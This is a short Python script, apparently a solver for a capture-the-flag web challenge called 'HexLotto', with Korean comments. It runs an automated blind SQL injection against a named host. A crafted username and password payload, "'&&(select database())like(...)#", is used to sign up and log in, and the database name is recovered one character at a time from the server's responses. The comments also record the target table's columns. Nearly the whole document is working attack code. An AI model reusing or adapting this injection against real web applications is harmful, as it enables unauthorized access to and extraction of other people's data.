import requests
from urllib.parse import quote

user = (lambda a,b,c:"http://sdhsroot.kro.kr/HexLotto/data/%s.php?id=%s&pw=%s"%(a,b,c))
payload = (lambda a:"'&&(select database())like('"+a+"%')#")
data = "num[]=0&num[]=0&num[]=0&num[]=0&num[]=0&num[]=0"
result = ""

# table : hexlotto
# columns : id, pw, point, number

# 풀이 : 새로 가입한 뒤 해당 계정의 number를 가져와 로또 번호에 넣으면 당첨이다.

for x in range(0, 20) :
	for y in ".0123456789abcdefghijklmnopqrstuvwxyz()-_" :
		username = quote(payload(result+y))
		print(payload(result+y))
		requests.get(user('signup', username, username))
		req = requests.get(user('login', username, username))
		requests.post("http://sdhsroot.kro.kr/HexLotto/data/lotto.php", data=data, cookies=req.cookies)
		res = requests.post("http://sdhsroot.kro.kr/HexLotto/data/lotto.php", data=data, cookies=req.cookies).content
		requests.get("http://sdhsroot.kro.kr/HexLotto/data/lotto.php", cookies=req.cookies)

		if(str(res).find("alert") == -1) :
			result += y
			break
		if(y == '_') :
			print("result : "+result)
			exit(1)

